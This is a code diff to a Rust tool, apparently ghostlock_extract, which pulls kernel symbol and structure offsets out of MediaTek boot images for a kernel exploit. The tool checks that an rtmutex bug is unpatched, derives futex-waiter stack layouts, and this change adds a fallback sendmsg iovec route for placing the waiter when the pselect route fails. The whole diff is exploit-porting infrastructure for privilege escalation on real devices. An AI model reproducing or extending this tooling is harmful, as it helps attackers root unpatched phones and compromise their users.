@@ -8,8 +8,8 @@ use clap::Parser;
 use ghostlock_extract::boot::{BootImage, MTK_DEFAULT_PHYS_LOAD, MTK_VADDR_BASE};
 use ghostlock_extract::btf::Btf;
 use ghostlock_extract::derive::{
-    PSELECT_ROUTE_NFDS, derive_nf_logger_registration, derive_pselect_layout,
-    ensure_rtmutex_43499_unpatched, relative_symbols,
+    PSELECT_ROUTE_NFDS, derive_iovec_layout, derive_nf_logger_registration,
+    derive_pselect_layout, ensure_rtmutex_43499_unpatched, relative_symbols,
 };
 use ghostlock_extract::error::{ExtractError, Result};
 use ghostlock_extract::fdt::recover_kernel_phys_load;
@@ -309,6 +309,7 @@ fn run(cli: &Cli) -> Result<i32> {
     let mut symbol_offsets = resolve_symbols(&symbols, base);
 
     let mut derived: BTreeMap<String, u64> = BTreeMap::new();
+    let mut iov_waiter_off: Option<i64> = None;
     if !cli.no_disasm {
         if let Some(btf) = &btf {
             match derive_pselect_layout(
@@ -344,7 +345,38 @@ fn run(cli: &Cli) -> Result<i32> {
                         layout.waiter_local,
                         layout.shift,
                     );
-                    derived.insert("pselect_waiter_shift_value".to_string(), shift as u64);
+                    if layout.feasible {
+                        derived.insert("pselect_waiter_shift_value".to_string(), shift as u64);
+                    } else {
+                        eprintln!(
+                            "warning: fd_set route not feasible on this kernel: {}",
+                            layout.infeasible_reason
+                        );
+                        match derive_iovec_layout(
+                            &boot.kernel,
+                            &rel_symbols,
+                            &sorted_offsets,
+                            btf,
+                            -layout.futex_waiter,
+                        ) {
+                            Ok(iov) => {
+                                eprintln!(
+                                    "info: sendmsg iovec route {} waiter=-{:#x} \
+                                     msghdr=-{:#x} iovstack=-{:#x} iov_waiter_off={:#x}",
+                                    iov.chain,
+                                    iov.waiter_depth,
+                                    iov.msghdr_depth,
+                                    iov.iovstack_depth,
+                                    iov.waiter_off,
+                                );
+                                iov_waiter_off = Some(iov.waiter_off);
+                            }
+                            Err(err) => {
+                                eprintln!("error: no usable waiter transport: {err}");
+                                return Ok(3);
+                            }
+                        }
+                    }
                 }
                 Err(ExtractError::Infeasible(message)) => {
                     eprintln!("error: pselect route not feasible on this kernel: {message}");
@@ -382,10 +414,12 @@ fn run(cli: &Cli) -> Result<i32> {
         .map(|value| value as i64)
         .unwrap_or_else(|| {
             let shift = report::pselect_waiter_shift_for(release.as_deref());
-            eprintln!(
-                "warning: using heuristic pselect_waiter_shift={shift} (6.12=0, 6.6=-2); \
-                 unreliable for kernels with a non-inlined do_pselect middle layer"
-            );
+            if iov_waiter_off.is_none() {
+                eprintln!(
+                    "warning: using heuristic pselect_waiter_shift={shift} (6.12=0, 6.6=-2); \
+                     unreliable for kernels with a non-inlined do_pselect middle layer"
+                );
+            }
             shift
         });
     if let Some(slot) = derived.get("off_slide_loggers_0_1").copied() {
@@ -469,6 +503,7 @@ fn run(cli: &Cli) -> Result<i32> {
             &struct_offsets,
             kernel_phys_load,
             pselect_shift,
+            iov_waiter_off,
         );
         let target = report::kernel_header_path(&key);
         if target.exists()
@@ -499,6 +534,7 @@ fn run(cli: &Cli) -> Result<i32> {
             &struct_offsets,
             kernel_phys_load,
             pselect_shift,
+            iov_waiter_off,
         )
     } else {
         let report_value = report::build_report(
@@ -509,6 +545,7 @@ fn run(cli: &Cli) -> Result<i32> {
             &struct_offsets,
             btf_size,
             pselect_shift,
+            iov_waiter_off,
         );
         serde_json::to_string_pretty(&report_value).unwrap() + "\n"
     };
